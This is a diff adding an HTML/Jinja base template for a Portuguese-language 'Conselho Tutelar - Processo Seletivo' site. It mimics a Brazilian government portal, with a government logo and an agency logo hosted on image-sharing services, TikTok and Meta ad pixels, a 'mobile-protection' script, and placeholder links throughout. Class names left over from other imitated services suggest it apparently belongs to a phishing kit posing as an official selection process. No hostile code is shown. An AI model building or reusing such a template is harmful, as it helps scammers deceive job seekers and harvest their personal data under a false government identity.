@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+      ttq.load('CVE2BIRC77UCRE2PJ1DG');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+    
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    
+    // Initialize pixels if configured
+    {% if meta_pixel_ids %}
+        {% for pixel_id in meta_pixel_ids %}
+        fbq('init', '{{ pixel_id }}');
+        {% endfor %}
+    {% endif %}
+    
+    fbq('track', 'PageView');
+    </script>
+    
+    <!-- NoScript fallback -->
+    <noscript>
+    {% if meta_pixel_ids %}
+        {% for pixel_id in meta_pixel_ids %}
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id={{ pixel_id }}&ev=PageView&noscript=1" />
+        {% endfor %}
+    {% endif %}
+    </noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conselho Tutelar - Processo Seletivo</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Rawline', 'sans-serif'],
+                        'heading': ['Rawline', 'sans-serif'],
+                        'body': ['Rawline', 'sans-serif']
+                    },
+                    colors: {
+                        'military': {
+                            'green': '#2D5A27',
+                            'dark': '#1A3B19',
+                            'light': '#4A7A44'
+                        },
+                        'prosegur': {
+                            'prosegur-blue': '#044785',
+                            'black': '#000000',
+                            'gray': '#666666',
+                            'blue': '#044785'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Rawline Font Family */
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+          font-weight: 400;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+          font-weight: 400;
+          font-style: italic;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+          font-weight: 600;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+          font-weight: 700;
+          font-style: normal;
+        }
+
+        /* Base Typography */
+        body {
+            font-family: 'Rawline', sans-serif !important;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        /* Consistent Font Weight for Bold Elements */
+        strong, .font-bold {
+          font-weight: 500 !important;
+        }
+
+        /* Standard Text Classes */
+        .encceja-title {
+          font-weight: 700;
+          font-size: 1rem;
+          color: #555;
+          line-height: normal;
+          text-transform: uppercase;
+          text-align: left;
+          margin-bottom: 1rem;
+        }
+
+        .main-title {
+          font-size: 1.4rem;
+          line-height: 2rem;
+          font-weight: 600;
+          color: #0c326f;
+          padding-bottom: 10px;
+          margin: 0;
+        }
+
+        .subtitle {
+          font-weight: 400;
+          font-size: 16px;
+          color: #555;
+          line-height: normal;
+          margin-bottom: 10px;
+        }
+
+        /* Drop Cap Effect */
+        .drop-cap::first-letter {
+          float: left;
+          font-size: 4em;
+          line-height: 0.68;
+          font-weight: bold;
+          margin-right: 0.05em;
+          color: #044785;
+        }
+
+        /* Standard Text Sizes and Colors */
+        .text-base {
+          font-size: 16px;
+          color: #555;
+          line-height: 1.5;
+        }
+
+        .text-gray-700 {
+          color: #374151;
+        }
+
+        /* Font Family Classes */
+        .font-heading, .font-body {
+          font-family: 'Rawline', sans-serif !important;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body class="flex flex-col min-h-screen bg-gray-50">
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- Conselho Tutelar Header -->
+    <div class="bg-white py-4 border-b-2 border-gray-300 shadow-sm">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/5NvvmF2C/506e4525-b3e0-4703-85c5-24050ba28e3f-removalai-preview.png" alt="Logo Conselho Tutelar" class="h-12 mx-auto" />
+        </div>
+    </div>
+
+    <main class="flex-grow container mx-auto px-4 py-8">
+        {% block content %}{% endblock %}
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#044785] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o Conselho Tutelar</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o Conselho Tutelar</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Objetivos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Como Atuamos</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Proteção Infantil</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Direitos da Criança</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas de Proteção</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Denúncias</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Orientação às Famílias</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">ECA - Estatuto</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Lei 8.069/90</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Direitos Fundamentais</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Deveres dos Pais</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas Socioeducativas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Rede de Proteção</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Processo Seletivo</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Como Participar</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Requisitos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Cronograma</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <hr class="border-blue-400 mb-6">
+            
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 Conselho Tutelar - Proteção dos Direitos da Criança e do Adolescente</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="{{ url_for('static', filename='js/validation.js') }}"></script>
+</body>
+</html>
